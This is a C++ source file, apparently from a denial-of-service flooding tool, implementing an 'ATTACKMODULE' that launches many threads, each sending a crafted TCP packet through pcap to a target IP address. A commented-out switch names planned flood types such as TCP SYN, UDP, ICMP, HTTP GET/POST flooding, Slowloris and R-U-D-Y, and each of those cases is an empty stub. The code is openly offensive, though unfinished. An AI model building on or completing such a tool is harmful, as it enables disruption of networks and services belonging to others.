#include "../lib/atkmod.hpp"

ATTACKMODULE::ATTACKMODULE(char* dev, std::string tip, int type, int speed, int dur){
    this->dev = dev;
    inet_pton(AF_INET, tip.c_str(), (void*)(&(this->tip)));
    this->type = type;
    this->speed = speed;
    this->dur = dur;
}

void ATTACKMODULE::attack(){
    std::thread AttackThreads[THREADS];
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i] = std::thread(&ATTACKMODULE::attack_routine, this);
    }
    
    for(int i = 0; i < THREADS; i++){
        AttackThreads[i].join();
    }
}

// TODO:make attack_routine function
void ATTACKMODULE::attack_routine(){

    std::unique_ptr<PKT<ETHIPTCP>> packet(new PKT<ETHIPTCP>(dev));
    packet->set_pcap();
    packet->make_packet(tip);
    packet->send_packet();
    
    /*
    switch(type){
    
    // TCP_SYN_ATTACK
    case 1:
        
        PKT<ETHIPTCP> packet(dev);
        packet.set_pcap();
        packet.make_packet(tip);
        packet.send_packet();

        break;
    
    // TCP_ACK_ATTACK
    case 2:

        break;

    // TCP_SYN-ACK_ATTACK
    case 3:

        break;
    
    // TCP_CONNECTION_ATTACK
    case 4:

        break;

    // TCP_CONGESTION_CONTROL_ATTACK
    case 5:

        break;

    // TCP_TSNAMI_ATTACK
    case 6:

        break;

    // UDP_ATTACK
    case 7:

        break;

    // ICMP_ATTACK
    case 8:

        break;

    // GET_FLOODING_ATTACK
    case 9:

        break;
    
    // POST_FLOODING_ATTACK
    case 10:

        break;
    
    // DYNAMIC_HTTP_REQ_FLOODING
    case 11:

        break;
    
    // SLOWLORIS_ATTACK
    case 12:

        break;
    
    // SLOWREAD_ATTACK
    case 13:

        break;

    // R-U-D-Y_ATTACK
    case 14:

        break;

    // BIG1_ATTACK
    case 15:

        break;
        
    default:
        printf("type error");
        break;
    }
    */
}